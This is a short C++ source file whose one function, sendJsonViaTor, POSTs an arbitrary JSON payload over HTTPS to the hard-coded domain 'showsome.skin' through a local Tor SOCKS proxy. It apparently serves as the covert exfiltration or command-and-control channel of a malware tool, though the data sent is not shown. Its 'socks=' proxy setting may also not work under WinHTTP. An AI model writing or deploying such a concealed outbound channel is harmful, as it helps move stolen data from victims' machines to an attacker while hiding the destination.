#include <windows.h>
#include <winhttp.h>
#include <string>
#include <iostream>

bool sendJsonViaTor(const std::string& jsonPayload) {
    // 1. Start a WinHTTP session
    HINTERNET hSession = WinHttpOpen(
        L"NetSwimmer/1.0",
        WINHTTP_ACCESS_TYPE_NO_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);

    if (!hSession) {
        std::cerr << "[!] WinHttpOpen failed\n";
        return false;
    }

    // 2. Configure proxy (SOCKS5 via local TOR)
    WINHTTP_PROXY_INFO proxyInfo;
    proxyInfo.dwAccessType = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
    proxyInfo.lpszProxy = (LPWSTR)L"socks=127.0.0.1:9050";
    proxyInfo.lpszProxyBypass = NULL;

    if (!WinHttpSetOption(hSession, WINHTTP_OPTION_PROXY, &proxyInfo, sizeof(proxyInfo))) {
        std::cerr << "[!] WinHttpSetOption failed\n";
        WinHttpCloseHandle(hSession);
        return false;
    }

    // 3. Connect to domain
    HINTERNET hConnect = WinHttpConnect(hSession, L"showsome.skin", INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) {
        std::cerr << "[!] WinHttpConnect failed\n";
        WinHttpCloseHandle(hSession);
        return false;
    }

    // 4. Open POST request
    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect,
        L"POST",
        L"/",
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE);

    if (!hRequest) {
        std::cerr << "[!] WinHttpOpenRequest failed\n";
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    // 5. Send JSON POST request
    BOOL bResults = WinHttpSendRequest(
        hRequest,
        L"Content-Type: application/json\r\n",
        0,
        (LPVOID)jsonPayload.c_str(),
        jsonPayload.length(),
        jsonPayload.length(),
        0);

    if (!bResults) {
        std::cerr << "[!] WinHttpSendRequest failed\n";
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    // 6. Wait for server response
    bResults = WinHttpReceiveResponse(hRequest, NULL);

    if (!bResults) {
        std::cerr << "[!] WinHttpReceiveResponse failed\n";
    }

    // 7. Cleanup
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return bResults == TRUE;
}
